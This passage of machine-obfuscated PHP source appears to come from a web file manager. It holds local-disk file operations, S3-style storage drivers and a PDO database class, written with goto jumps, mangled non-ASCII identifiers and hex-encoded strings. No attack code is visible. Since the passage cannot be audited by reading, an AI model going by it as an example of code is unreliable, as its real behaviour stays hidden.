0, 2) == $b÷‡¿ø¢­„[1207]) { $C„æ·ÇŒëñ = BASIC_PATH . substr($C„æ·ÇŒëñ, 2); } if (substr($C‘Ä·ªœ’, 0, 2) == $b÷‡¿ø¢­„[1207]) { $C‘Ä·ªœ’ = BASIC_PATH . substr($C‘Ä·ªœ’, 2); } $C„æ·ÇŒëñ = KodIO::clear($C„æ·ÇŒëñ); goto F“ë¿èØÅò; d…™˜¾õ¢Ş: $b÷‡¿ø¢­„ =& $_SERVER[¢Í]; $C„æ·ÇŒëñ = $this->iconvApp($this->pathBase); $C‘Ä·ªœ’ = $this->iconvApp($C‘Ä·ªœ’); goto B‰Ï¾Œ¥ÊÜ; aÎ­Éº¤¯ª: } public function mkfile($Dà®ƒîÌ×è, $cà‰æ…‡Ïß = '', $c—÷¼¾ö‚í = REPEAT_RENAME) { $Dà®ƒîÌ×è = $this->iconvSystem($Dà®ƒîÌ×è); @touch($Dà®ƒîÌ×è); if ($cà‰æ…‡Ïß) { file_put_contents($Dà®ƒîÌ×è, $cà‰æ…‡Ïß); } return is_file($Dà®ƒîÌ×è) ? $this->getPathOuter($Dà®ƒîÌ×è) : !1; } public function mkdir($F¦ìà¥ïí, $e†ÕŠ”äó÷ = REPEAT_SKIP) { $F¦ìà¥ïí = $this->iconvSystem($F¦ìà¥ïí); if (is_dir($F¦ìà¥ïí)) { return $this->getPathOuter($F¦ìà¥ïí); } @mkdir($F¦ìà¥ïí, 511, !0); return is_dir($F¦ìà¥ïí) ? $this->getPathOuter($F¦ìà¥ïí) : !1; } public function copyFile($fáåŒ®µ¥æ, $b‹£¾õš) { $this->mkdir($this->pathFather($b‹£¾õš)); $fáåŒ®µ¥æ = $this->iconvSystem($fáåŒ®µ¥æ); $b‹£¾õš = $this->iconvSystem($b‹£¾õš); $AÖÖ±î¢÷ = copy_64($fáåŒ®µ¥æ, $b‹£¾õš); return $AÖÖ±î¢÷ ? $this->getPathOuter($b‹£¾õš) : !1; } public function moveFile($c×ƒœÅ§é“, $FİŞÎë—î) { $this->mkdir($this->pathFather($FİŞÎë—î)); $c×ƒœÅ§é“ = $this->iconvSystem($c×ƒœÅ§é“); $FİŞÎë—î = $this->iconvSystem($FİŞÎë—î); $aÈ­Œ‡¹Ë = intval(@rename($c×ƒœÅ§é“, $FİŞÎë—î)); if (!$aÈ­Œ‡¹Ë) { if ($aÈ­Œ‡¹Ë = intval(@copy_64($c×ƒœÅ§é“, $FİŞÎë—î))) { @unlink($c×ƒœÅ§é“); } } return $aÈ­Œ‡¹Ë ? $this->getPathOuter($FİŞÎë—î) : !1; } public function delFile($bó«ŒÔÓöé) { $bó«ŒÔÓöé = $this->iconvSystem($bó«ŒÔÓöé); if (!@unlink($bó«ŒÔÓöé)) { @chmod($bó«ŒÔÓöé, 511); if (!@unlink($bó«ŒÔÓöé)) { return !1; } } else { return !0; } } public function delFolder($fİˆ´ÚÆÀ†) { goto DÁÒŠâ¸Ë; DÁÒŠâ¸Ë: $bÈÖ²Öàé =& $_SERVER[¢Í]; $fİˆ´ÚÆÀ† = $this->iconvSystem($fİˆ´ÚÆÀ†); if (!is_dir($fİˆ´ÚÆÀ†)) { return !0; } goto e £ëÑ¥İâ; e £ëÑ¥İâ: if (!($C÷Êø„˜ğ = opendir($fİˆ´ÚÆÀ†))) { return !1; } while (($cø©¡±ğ÷ = readdir($C÷Êø„˜ğ)) !== !1) { if ($cø©¡±ğ÷ == $bÈÖ²Öàé[101] || $cø©¡±ğ÷ == $bÈÖ²Öàé[1214]) { continue; } $E‚†ÜçŒºÄ = $fİˆ´ÚÆÀ† . $bÈÖ²Öàé[8] . $cø©¡±ğ÷; if (is_file($E‚†ÜçŒºÄ) || is_link($E‚†ÜçŒºÄ)) { if (!unlink($E‚†ÜçŒºÄ)) { chmod($E‚†ÜçŒºÄ, 511); if (!unlink($E‚†ÜçŒºÄ)) { return !1; } } } else { if (is_dir($E‚†ÜçŒºÄ)) { chmod($E‚†ÜçŒºÄ, 511); $E‚†ÜçŒºÄ = $this->iconvApp($E‚†ÜçŒºÄ); if (!$this->delFolder($E‚†ÜçŒºÄ)) { return !1; } } } } closedir($C÷Êø„˜ğ); goto e¢Ğºòê; e¢Ğºòê: return rmdir($fİˆ´ÚÆÀ†); goto Bäê¶ºŞ¿´; Bäê¶ºŞ¿´: } public function rename($BÅ«‹‡‘‘, $fÕå‰„ƒáÕ) { goto c–Öñª¯í•; c–Öñª¯í•: $B¨•²ŠÍ¤ñ =& $_SERVER[¢Í]; $CøåÕçƒ = $this->fileNameAuto($this->pathFather($BÅ«‹‡‘‘), $fÕå‰„ƒáÕ); $CøåÕçƒ = $this->iconvSystem($CøåÕçƒ); goto C»è½ºãÚ†; C»è½ºãÚ†: $BÅ«‹‡‘‘ = $this->iconvSystem($BÅ«‹‡‘‘); $EÜ¶£… = $this->pathFather($BÅ«‹‡‘‘); $a¾¿Ğ˜Ôéœ = rtrim($EÜ¶£…, $B¨•²ŠÍ¤ñ[8]) . $B¨•²ŠÍ¤ñ[8] . $CøåÕçƒ; goto f„ÆÊŒÓÙ†; f„ÆÊŒÓÙ†: $AßéßÇ¶«è = @rename($BÅ«‹‡‘‘, $a¾¿Ğ˜Ôéœ); $a¾¿Ğ˜Ôéœ = $this->iconvApp($a¾¿Ğ˜Ôéœ); return $AßéßÇ¶«è ? $this->getPathOuter($a¾¿Ğ˜Ôéœ) : !1; goto eñ¯¸æ­É; eñ¯¸æ­É: } public function size($EÙŞòéî•Ó) { $EÙŞòéî•Ó = $this->iconvSystem($EÙŞòéî•Ó); return filesize_64($EÙŞòéî•Ó); } public function info($c–×¦¤§±¹) { $c–×¦¤§±¹ = $this->iconvSystem($c–×¦¤§±¹); if ($this->isFolder($c–×¦¤§±¹)) { return $this->folderInfo($c–×¦¤§±¹); } else { if ($this->isFile($c–×¦¤§±¹)) { return $this->fileInfo($c–×¦¤§±¹); } } return !1; } protected function infoChildren($B™ô¥¾•¼, &$a‘–«¶™Œñ, $b†‚¨•ÛÏ = true) { goto c‰îèï ñ˜; c‰îèï ñ˜: $d†ˆØ‘‰  =& $_SERVER[¢Í]; check_abort_echo(); $B™ô¥¾•¼ = rtrim($B™ô¥¾•¼, $d†ˆØ‘‰ [8]) . $d†ˆØ‘‰ [8]; goto D³¬Á¾Ÿ¼À; cºæ§õÏ‚: closedir($EÚğÍÑ¨Ë); goto cÆ‚Á•­Îİ; D³¬Á¾Ÿ¼À: if ($b†‚¨•ÛÏ) { $B™ô¥¾•¼ = $this->iconvSystem($B™ô¥¾•¼); } if (!($EÚğÍÑ¨Ë = @opendir($B™ô¥¾•¼))) { return; } while (($E’¹Ş‹Ïº = readdir($EÚğÍÑ¨Ë)) !== !1) { if ($E’¹Ş‹Ïº == $d†ˆØ‘‰ [101] || $E’¹Ş‹Ïº == $d†ˆØ‘‰ [1214]) { continue; } $C“ôè›î„Ò = $B™ô¥¾•¼ . $E’¹Ş‹Ïº; if (is_file($C“ôè›î„Ò) || is_link($C“ôè›î„Ò)) { $a‘–«¶™Œñ[$d†ˆØ‘‰ [88]]++; $a‘–«¶™Œñ[$d†ˆØ‘‰ [87]] += filesize_64($C“ôè›î„Ò); } else { if (is_dir($C“ôè›î„Ò)) { $a‘–«¶™Œñ[$d†ˆØ‘‰ [89]]++; $this->infoChildren($C“ôè›î„Ò, $a‘–«¶™Œñ, !1); } } } goto cºæ§õÏ‚; cÆ‚Á•­Îİ: } private function folderInfo($Aù¾„£Æ•Ò, $c’ïÍù†š = false) { $DŠ‹ƒ‚Ïæ´ =& $_SERVER[¢Í]; $Aù¾„£Æ•Ò = rtrim($Aù¾„£Æ•Ò, $DŠ‹ƒ‚Ïæ´[8]) . $DŠ‹ƒ‚Ïæ´[8]; $BÂˆ¯ï¥Ä¥ = $this->iconvApp($this->pathThis($Aù¾„£Æ•Ò)); if ($c’ïÍù†š) { return array($DŠ‹ƒ‚Ïæ´[28] => $BÂˆ¯ï¥Ä¥, $DŠ‹ƒ‚Ïæ´[85] => $this->getPathOuter($Aù¾„£Æ•Ò), $DŠ‹ƒ‚Ïæ´[29] => $DŠ‹ƒ‚Ïæ´[86]); } $eãÔ¹ã°—¯ = array($DŠ‹ƒ‚Ïæ´[28] => $BÂˆ¯ï¥Ä¥, $DŠ‹ƒ‚Ïæ´[85] => $this->getPathOuter($Aù¾„£Æ•Ò), $DŠ‹ƒ‚Ïæ´[29] => $DŠ‹ƒ‚Ïæ´[86], $DŠ‹ƒ‚Ïæ´[200] => @filectime($Aù¾„£Æ•Ò), $DŠ‹ƒ‚Ïæ´[117] => @filemtime($Aù¾„£Æ•Ò), $DŠ‹ƒ‚Ïæ´[1217] => @fileatime($Aù¾„£Æ•Ò), $DŠ‹ƒ‚Ïæ´[1218] => is_readable($Aù¾„£Æ•Ò), $DŠ‹ƒ‚Ïæ´[1219] => is_writable($Aù¾„£Æ•Ò), $DŠ‹ƒ‚Ïæ´[1220] => get_mode($Aù¾„£Æ•Ò)); return $eãÔ¹ã°—¯; } private function fileInfo($eÎ‰–Ï£‚­, $Eƒ¥éÚÓŞÔ = false) { $F‰®£·¯± =& $_SERVER[¢Í]; $bº‰¿¥Äá¼ = $this->iconvApp($this->pathThis($eÎ‰–Ï£‚­)); if ($Eƒ¥éÚÓŞÔ) { return array($F‰®£·¯±[28] => $bº‰¿¥Äá¼, $F‰®£·¯±[85] => $this->getPathOuter($eÎ‰–Ï£‚­), $F‰®£·¯±[29] => $F‰®£·¯±[181], $F‰®£·¯±[87] => $this->size($eÎ‰–Ï£‚­), $F‰®£·¯±[175] => $this->ext($bº‰¿¥Äá¼)); } $A„–¯»†ª› = array($F‰®£·¯±[28] => $bº‰¿¥Äá¼, $F‰®£·¯±[85] => $this->getPathOuter($eÎ‰–Ï£‚­), $F‰®£·¯±[29] => $F‰®£·¯±[181], $F‰®£·¯±[200] => @filectime($eÎ‰–Ï£‚­), $F‰®£·¯±[117] => @filemtime($eÎ‰–Ï£‚­), $F‰®£·¯±[1217] => @fileatime($eÎ‰–Ï£‚­), $F‰®£·¯±[87] => $this->size($eÎ‰–Ï£‚­), $F‰®£·¯±[175] => $this->ext($bº‰¿¥Äá¼), $F‰®£·¯±[1218] => is_readable($eÎ‰–Ï£‚­), $F‰®£·¯±[1219] => is_writable($eÎ‰–Ï£‚­), $F‰®£·¯±[1220] => get_mode($eÎ‰–Ï£‚­)); return $A„–¯»†ª›; } public function exist($a°¾Û—»çÍ) { $a°¾Û—»çÍ = $this->iconvSystem($a°¾Û—»çÍ); return @file_exists($a°¾Û—»çÍ); } public function isFile($B‘ÕµƒÄ‡º) { $B‘ÕµƒÄ‡º = $this->iconvSystem($B‘ÕµƒÄ‡º); return @is_file($B‘ÕµƒÄ‡º); } public function isFolder($eÉ‚£ø†›æ) { $eÉ‚£ø†›æ = $this->iconvSystem($eÉ‚£ø†›æ); return @is_dir($eÉ‚£ø†›æ); } public function listPath($CØ’Ò£«ÊÆ, $f‹Ôöô³ØÒ = false) { goto Bó´Ä­éæ°; e³®¢æ¢¸ì: $EªíÙİ‹¢Ú = array($DŒİ°ë ê»[84] => array(), $DŒİ°ë ê»[83] => array()); if (!($a”šŠïáÓİ = @opendir($CØ’Ò£«ÊÆ))) { return $EªíÙİ‹¢Ú; } while (($b¡ìËÑ¦» = readdir($a”šŠïáÓİ)) !== !1) { if ($b¡ìËÑ¦» == $DŒİ°ë ê»[101] || $b¡ìËÑ¦» == $DŒİ°ë ê»[1214]) { continue; } $A’öœÌ÷ = $CØ’Ò£«ÊÆ . $b¡ìËÑ¦»; if (is_file($A’öœÌ÷)) { $EªíÙİ‹¢Ú[$DŒİ°ë ê»[83]][] = $this->fileInfo($A’öœÌ÷, $f‹Ôöô³ØÒ); } else { $EªíÙİ‹¢Ú[$DŒİ°ë ê»[84]][] = $this->folderInfo($A’öœÌ÷, $f‹Ôöô³ØÒ); } } goto BÙ¬Š¶„¹¹; Bó´Ä­éæ°: $DŒİ°ë ê» =& $_SERVER[¢Í]; $CØ’Ò£«ÊÆ = $this->iconvSystem($CØ’Ò£«ÊÆ); $CØ’Ò£«ÊÆ = rtrim($CØ’Ò£«ÊÆ, $DŒİ°ë ê»[8]) . $DŒİ°ë ê»[8]; goto e³®¢æ¢¸ì; BÙ¬Š¶„¹¹: closedir($a”šŠïáÓİ); return $EªíÙİ‹¢Ú; goto dæÎ”„áÒ; dæÎ”„áÒ: } public function listAll($e»Š„äƒÚ¬, &$B÷‚ò˜œÅ¢ = array()) { goto cãµÎÔ©×®; dŠŞé¬ˆéÙ: if (!($b¹†“¶ï = @opendir($e»Š„äƒÚ¬))) { return $B÷‚ò˜œÅ¢; } while (($Cã‰ŠƒØ = readdir($b¹†“¶ï)) !== !1) { if ($Cã‰ŠƒØ == $B¥Ø£¾Ÿİ§[101] || $Cã‰ŠƒØ == $B¥Ø£¾Ÿİ§[1214]) { continue; } $FÂ†•­àÛï = $e»Š„äƒÚ¬ . $Cã‰ŠƒØ; if (is_dir($FÂ†•­àÛï) && !is_link($FÂ†•­àÛï)) { $B÷‚ò˜œÅ¢[] = array($B¥Ø£¾Ÿİ§[85] => $FÂ†•­àÛï . $B¥Ø£¾Ÿİ§[8], $B¥Ø£¾Ÿİ§[86] => 1, $B¥Ø£¾Ÿİ§[117] => @filemtime($FÂ†•­àÛï), $B¥Ø£¾Ÿİ§[87] => 0); $this->listAll($FÂ†•­àÛï, $B÷‚ò˜œÅ¢); } else { $B÷‚ò˜œÅ¢[] = array($B¥Ø£¾Ÿİ§[85] => $FÂ†•­àÛï, $B¥Ø£¾Ÿİ§[86] => 0, $B¥Ø£¾Ÿİ§[117] => @filemtime($FÂ†•­àÛï), $B¥Ø£¾Ÿİ§[87] => $this->size($FÂ†•­àÛï)); } } closedir($b¹†“¶ï); goto DêÀ¤‰«çŒ; DêÀ¤‰«çŒ: return $B÷‚ò˜œÅ¢; goto AÎª„Õ«˜; cãµÎÔ©×®: $B¥Ø£¾Ÿİ§ =& $_SERVER[¢Í]; $e»Š„äƒÚ¬ = $this->iconvSystem($e»Š„äƒÚ¬); $e»Š„äƒÚ¬ = rtrim($e»Š„äƒÚ¬, $B¥Ø£¾Ÿİ§[8]) . $B¥Ø£¾Ÿİ§[8]; goto dŠŞé¬ˆéÙ; AÎª„Õ«˜: } public function has($FòÅãÄ×›±, $a‡ìÅ×ïÑç = false, $F»ˆ˜¬–‚ = true) { goto d™¬Í´œ’Ë; CìŸß×ÔÏ: if ($a‡ìÅ×ïÑç) { return array($dÍí¾…‹§[209] => $C°Õ¾ë §Õ, $dÍí¾…‹§[210] => $aã­ÓÖ¼†Ú); } return !1; goto e±Õ•·…İ×; d™¬Í´œ’Ë: $dÍí¾…‹§ =& $_SERVER[¢Í]; $FòÅãÄ×›± = $this->iconvSystem($FòÅãÄ×›±); $FòÅãÄ×›± = rtrim($FòÅãÄ×›±, $dÍí¾…‹§[8]) . $dÍí¾…‹§[8]; goto d”óßÈ×—›; cÑ†ˆ«ŸÁæ: $a²™šŒæ© = 0; while (($BÆÅ›Ôöß = readdir($FÛ†µ…¿ÊŸ)) !== !1) { if ($BÆÅ›Ôöß == $dÍí¾…‹§[101] || $BÆÅ›Ôöß == $dÍí¾…‹§[1214]) { continue; } $Fì¿¼ÄÚ¶… = $FòÅãÄ×›± . $BÆÅ›Ôöß; if ($a‡ìÅ×ïÑç) { $a²™šŒæ©++; if (@is_file($Fì¿¼ÄÚ¶…)) { $C°Õ¾ë §Õ++; } else { $aã­ÓÖ¼†Ú++; } if ($a²™šŒæ© > 10000) { break; } continue; } if ($F»ˆ˜¬–‚) { if (@is_file($Fì¿¼ÄÚ¶…)) { return !0; } } else { if (@is_dir($Fì¿¼ÄÚ¶… . $dÍí¾…‹§[8])) { return !0; } } } closedir($FÛ†µ…¿ÊŸ); goto CìŸß×ÔÏ; d”óßÈ×—›: if (!($FÛ†µ…¿ÊŸ = @opendir($FòÅãÄ×›±))) { return !1; } $C°Õ¾ë §Õ = 0; $aã­ÓÖ¼†Ú = 0; goto cÑ†ˆ«ŸÁæ; e±Õ•·…İ×: } public function hashSimple($fôÙÌŠï‘½) { goto AÁÖ¤¹„º; aßê†È¿Œñ: if ($bÍ¼ÆÜÙ¸Ù <= $C™ÇŒ÷÷Š * $a—ÃšôçÖÍ) { return $this->hashMd5($fôÙÌŠï‘½) . $bÍ¼ÆÜÙ¸Ù; } $bÜ“·ç¥•Ë = $cñĞ¢¦¼õ[33]; $dççš¡¸•Ğ = intval($bÍ¼ÆÜÙ¸Ù / $a—ÃšôçÖÍ); goto AÍ«‡‹¯Ëß; Eäºèòåç : $bÍ¼ÆÜÙ¸Ù = $this->size($fôÙÌŠï‘½); $C™ÇŒ÷÷Š = 200; $a—ÃšôçÖÍ = 50; goto aßê†È¿Œñ; AÍ«‡‹¯Ëß: $FìÏ¬æˆ¸Š = fopen($fôÙÌŠï‘½, $cñĞ¢¦¼õ[1221]); if (!$FìÏ¬æˆ¸Š) { return $bÜ“·ç¥•Ë; } for ($bÍÛ‘ˆóÍ¡ = 0; $bÍÛ‘ˆóÍ¡ < $a—ÃšôçÖÍ; $bÍÛ‘ˆóÍ¡++) { fseek_64($FìÏ¬æˆ¸Š, $dççš¡¸•Ğ * $bÍÛ‘ˆóÍ¡); $bÜ“·ç¥•Ë .= fread($FìÏ¬æˆ¸Š, $C™ÇŒ÷÷Š); } goto DŠˆà‚‹÷ó; a·Úò®áê: return md5($bÜ“·ç¥•Ë) . $bÍ¼ÆÜÙ¸Ù; goto C²Ì‘È­; DŠˆà‚‹÷ó: fseek_64($FìÏ¬æˆ¸Š, $bÍ¼ÆÜÙ¸Ù - $C™ÇŒ÷÷Š); $bÜ“·ç¥•Ë .= fread($FìÏ¬æˆ¸Š, $C™ÇŒ÷÷Š); fclose($FìÏ¬æˆ¸Š); goto a·Úò®áê; AÁÖ¤¹„º: $cñĞ¢¦¼õ =& $_SERVER[¢Í]; if (!$fôÙÌŠï‘½) { return md5($cñĞ¢¦¼õ[33]); } $fôÙÌŠï‘½ = $this->iconvSystem($fôÙÌŠï‘½); goto Eäºèòåç ; C²Ì‘È­: } public function getContent($aŒÙíØ“ö¤) { $aŒÙíØ“ö¤ = $this->iconvSystem($aŒÙíØ“ö¤); return file_get_contents($aŒÙíØ“ö¤); } public function setContent($BŸóÚàŞ¶õ, $B‰„†¸¾©¸ = '') { $BŸóÚàŞ¶õ = $this->iconvSystem($BŸóÚàŞ¶õ); $Aäö¶¯Û„’ = @file_put_contents($BŸóÚàŞ¶õ, $B‰„†¸¾©¸, LOCK_EX); clearstatcache(); return $Aäö¶¯Û„’ === !1 ? !1 : !0; } public function fileSubstr($DˆµĞ„‡Œ¨, $eôÛîÏ˜Ş = 0, $f÷ØÉÛ’å = false) { goto a´áÏ¹Ë«Õ; Eô£—öåİ: return $e°ªÔÑ®ƒ˜; goto EçŞ¢ëâ¹ç; a´áÏ¹Ë«Õ: $EÑø”ì¤•í =& $_SERVER[¢Í]; $DˆµĞ„‡Œ¨ = $this->iconvSystem($DˆµĞ„‡Œ¨); if ($f÷ØÉÛ’å === !1) { $f÷ØÉÛ’å = $this->size($DˆµĞ„‡Œ¨); } goto Aù¶é‹£–Ê; DÀ¢êêÛ½: fseek_64($FàÏĞµÄËÙ, $eôÛîÏ˜Ş); $e°ªÔÑ®ƒ˜ = fread($FàÏĞµÄËÙ, $f÷ØÉÛ’å); fclose($FàÏĞµÄËÙ); goto Eô£—öåİ; Aù¶é‹£–Ê: if ($f÷ØÉÛ’å <= 0) { return $EÑø”ì¤•í[33]; } $FàÏĞµÄËÙ = fopen($DˆµĞ„‡Œ¨, $EÑø”ì¤•í[1221]); if (!$FàÏĞµÄËÙ) { return !1; } goto DÀ¢êêÛ½; EçŞ¢ëâ¹ç: } public function upload($DÀµ‹ôåÈ, $DùŒÃ§„Ï, $B¹å¨à°¼Å = false, $d½†Ş¹ù–Ì = REPEAT_REPLACE) { $FøãŠËÛœŞ = $this->copyFile($DùŒÃ§„Ï, $DÀµ‹ôåÈ); return $FøãŠËÛœŞ ? $this->getPathOuter($DÀµ‹ôåÈ) : !1; } public function setModifyTime($Fö£¼§»‚, $fª®Ö¿¡êå = '') { @touch($Fö£¼§»‚, intval($fª®Ö¿¡êå)); } public function download($aöÜ‚‘ÂÁ, $bˆÈ´ÛÇÓ¢) { return $this->iconvSystem($aöÜ‚‘ÂÁ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($B–¤ ½Èâ) { parent::__construct($B–¤ ½Èâ); $this->signatureVersion($_SERVER[¢Í][218]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($EíÉ÷ÌÌÉ¯) { parent::__construct($EíÉ÷ÌÌÉ¯); $this->signatureVersion($_SERVER[¢Í][218]); } public function fileOutLink($E»œÀÂ÷›Î) { $aò¯˜—Ñ«® =& $_SERVER[¢Í]; if (substr($E»œÀÂ÷›Î, 0, 7) == $aò¯˜—Ñ«®[1167]) { $E»œÀÂ÷›Î = $aò¯˜—Ñ«®[1168] . substr($E»œÀÂ÷›Î, 7); } header($aò¯˜—Ñ«®[166] . $E»œÀÂ÷›Î); die; } } goto d³±Ì¹¨ßò; B‰§Ø•¾®Ä: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($FœÃÓÈ–ï = '') { $AæÛ‰•Éõš =& $_SERVER[¢Í]; if (!class_exists($AæÛ‰•Éõš[841])) { think_exception(think_lang($AæÛ‰•Éõš[10]) . $AæÛ‰•Éõš[842]); } if (!empty($FœÃÓÈ–ï)) { $this->config = $FœÃÓÈ–ï; if (empty($this->config[$AæÛ‰•Éõš[13]])) { $this->config[$AæÛ‰•Éõš[13]] = array(); } } } public function connect($e¹ŞĞ»Ä“Ø = '', $aªšôö·äç = 0) { $f×Ä˜Ü‹¦È =& $_SERVER[¢Í]; if (!isset($this->linkID[$aªšôö·äç])) { goto BÛé‡é™á; fĞ×õ‹äÏ‘: if (!$this->linkID[$aªšôö·äç]) { think_exception($f×Ä˜Ü‹¦È[851]); } try { $this->linkID[$aªšôö·äç]->exec($f×Ä˜Ü‹¦È[852] . think_config($f×Ä˜Ü‹¦È[819])); } catch (Exception $bèªİ…ë­º) { } $this->connected = !0; goto dâ†ßª†•ä; dâ†ßª†•ä: if (1 != think_config($f×Ä˜Ü‹¦È[18])) { unset($this->config); } goto e•¹„ÓÌè; EïÄ¨ø¥×¤: try { $this->linkID[$aªšôö·äç] = new PDO($e¹ŞĞ»Ä“Ø[$f×Ä˜Ü‹¦È[843]], $e¹ŞĞ»Ä“Ø[$f×Ä˜Ü‹¦È[816]], $e¹ŞĞ»Ä“Ø[$f×Ä˜Ü‹¦È[817]], $e¹ŞĞ»Ä“Ø[$f×Ä˜Ü‹¦È[13]]); } catch (PDOException $bèªİ…ë­º) { think_exception($bèªİ…ë­º->getMessage()); } $this->dbType = $this->_getDsnType($e¹ŞĞ»Ä“Ø[$f×Ä˜Ü‹¦È[843]]); if (in_array($this->dbType, array($f×Ä˜Ü‹¦È[844], $f×Ä˜Ü‹¦È[845], $f×Ä˜Ü‹¦È[846], $f×Ä˜Ü‹¦È[847]))) { think_exception($f×Ä˜Ü‹¦È[848] . $this->dbType . $f×Ä˜Ü‹¦È[849] . $this->dbType . $f×Ä˜Ü‹¦È[850]); } goto fĞ×õ‹äÏ‘; BÛé‡é™á: if (empty($e¹ŞĞ»Ä“Ø)) { $e¹ŞĞ»Ä“Ø = $this->config; } $E¡¢ìø§ = !empty($e¹ŞĞ»Ä“Ø[$f×Ä˜Ü‹¦È[13]][$f×Ä˜Ü‹¦È[14]]) ? $e¹ŞĞ»Ä“Ø[$f×Ä˜Ü‹¦È[13]][$f×Ä˜Ü‹¦È[14]] : $this->pconnect; if ($E¡¢ìø§) { $e¹ŞĞ»Ä“Ø[$f×Ä˜Ü‹¦È[13]][PDO::ATTR_PERSISTENT] = !0; } goto EïÄ¨ø¥×¤; e•¹„ÓÌè: } return $this->linkID[$aªšôö·äç]; } public function free() { $this->PDOStatement = null; } public function query($cöÌ”ì‹øĞ, $FÂ‰²ëâ¸ = array()) { goto Bİáøø «; CŞàÑŒë°: think_action_status($dÍŞøè³‡»[19], 1); think_status($dÍŞøè³‡»[20]); $this->PDOStatement = $this->_linkID->prepare($cöÌ”ì‹øĞ); goto C‘ì†¨¯‡›; EÄâßÍ¥îÂ: if (!1 === $AåÙÍ…ÃÖ–) { $this->error(); return !1; } else { return $this->getAll(); } goto eĞ“¿¿ßÎ; EĞì‰ÛõÊí: $this->queryStr = $cöÌ”ì‹øĞ; if (!empty($FÂ‰²ëâ¸)) { $this->queryStr .= $dÍŞøè³‡»[853] . print_r($FÂ‰²ëâ¸, !0) . $dÍŞøè³‡»[854]; } if (!empty($this->PDOStatement)) { $this->free(); } goto CŞàÑŒë°; Bİáøø «: $dÍŞøè³‡» =& $_SERVER[¢Í]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EĞì‰ÛõÊí; C‘ì†¨¯‡›: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $AåÙÍ…ÃÖ– = $this->PDOStatement->execute($FÂ‰²ëâ¸); $this->debug(); goto EÄâßÍ¥îÂ; eĞ“¿¿ßÎ: } public function execute($FŠßÉ¾–õó, $cÓöùÕ‚Ó = array()) { goto BçŒÆÛ•‘å; a¸¿‹¥©óÍ: $this->queryStr = $FŠßÉ¾–õó; if (!empty($cÓöùÕ‚Ó)) { $this->queryStr .= $dœòºàÒ†¡[853] . print_r($cÓöùÕ‚Ó, !0) . $dœòºàÒ†¡[854]; } $B‹Ğ–¦¬ç = !1; goto D“´Ğ¨Ù´ù; BçŒÆÛ•‘å: $dœòºàÒ†¡ =& $_SERVER[¢Í]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a¸¿‹¥©óÍ; D£“…¦ï: $Bæ‚¡•¢éí = $this->PDOStatement->execute($cÓöùÕ‚Ó); $this->debug(); if (!1 === $Bæ‚¡•¢éí) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($B‹Ğ–¦¬ç || preg_match($dœòºàÒ†¡[859], $FŠßÉ¾–õó)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto EƒÔÅ‘ë¢; D“´Ğ¨Ù´ù: if ($this->dbType == $dœòºàÒ†¡[847]) { if (preg_match($dœòºàÒ†¡[855], $this->queryStr, $bñòæ¦ÅÖÀ)) { $this->table = think_config($dœòºàÒ†¡[856]) . str_ireplace(think_config($dœòºàÒ†¡[857]), $dœòºàÒ†¡[377], $bñòæ¦ÅÖÀ[2]); $B‹Ğ–¦¬ç = (bool) $this->query($dœòºàÒ†¡[858] . strtoupper($this->table) . $dœòºàÒ†¡[65]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($dœòºàÒ†¡[21], 1); goto D›”Ÿ’ù; D›”Ÿ’ù: think_status($dœòºàÒ†¡[20]); $this->PDOStatement = $this->_linkID->prepare($FŠßÉ¾–õó); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto D£“…¦ï; EƒÔÅ‘ë¢: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f·ÕÆ±ˆÄ = $this->_linkID->commit(); $this->transTimes = 0; if (!$f·ÕÆ±ˆÄ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $fó–½—Êé = $this->_linkID->rollback(); $this->transTimes = 0; if (!$fó–½—Êé) { $this->error(); return !1; } } return !0; } private function getAll() { $DĞéù­”á… = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($DĞéù­”á…); return $DĞéù­”á…; } public function getFields($Fíï¹ËéŸ³) { goto CÎŞäñ–¥«; A§ë‚Íá: return $B‡Í¼“½âŒ; goto DºòØ–á¯œ; CÎŞäñ–¥«: $d¸Ç Ê£’ =& $_SERVER[¢Í]; $this->initConnect(!0); if (think_config($d¸Ç Ê£’[860])) { $c÷ÄñÍÒ÷ = str_replace($d¸Ç Ê£’[861], $Fíï¹ËéŸ³, think_config($d¸Ç Ê£’[860])); } else { switch ($this->dbType) { case $d¸Ç Ê£’[844]: case $d¸Ç Ê£’[862]: $c÷ÄñÍÒ÷ = "\123\105\114\105\x43\124\40\40\40\x63\157\154\165\155\x6e\137\156\141\155\145\x20\141\x73\x20\47\x4e\x61\x6d\x65\47\x2c\40\x20\40\144\141\x74\x61\137\164\x79\160\145\40\141\163\40\x27\124\171\160\x65\47\54\x20\40\x20\x63\x6f\154\165\155\x6e\x5f\144\x65\x66\x61\165\x6c\164\x20\141\x73\40\x27\x44\145\x66\141\165\x6c\164\x27\x2c\x20\x20\40\x69\x73\137\x6e\165\154\x6c\141\x62\154\x65\40\141\163\40\x27\116\165\x6c\x6c\x27\12\11\11\x46\122\x4f\115\x9\151\156\146\x6f\x72\155\141\164\151\x6f\156\x5f\163\x63\150\145\x6d\x61\x2e\164\x61\142\154\145\163\40\101\x53\x20\164\xa\11\x9\112\x4f\x49\116\11\x69\x6e\146\157\x72\x6d\x61\x74\151\157\156\137\163\x63\150\x65\x6d\x61\56\x63\157\154\165\155\x6e\x73\x20\101\123\x20\x63\xa\x9\11\x4f\116\40\40\x74\56\164\141\x62\154\145\137\x63\141\164\141\154\x6f\147\40\x3d\x20\143\56\164\141\142\154\145\x5f\143\141\164\x61\x6c\x6f\x67\xa\11\11\101\x4e\104\x20\x74\x2e\x74\141\142\154\x65\x5f\163\143\150\145\155\141\x20\75\40\143\56\164\141\x62\154\145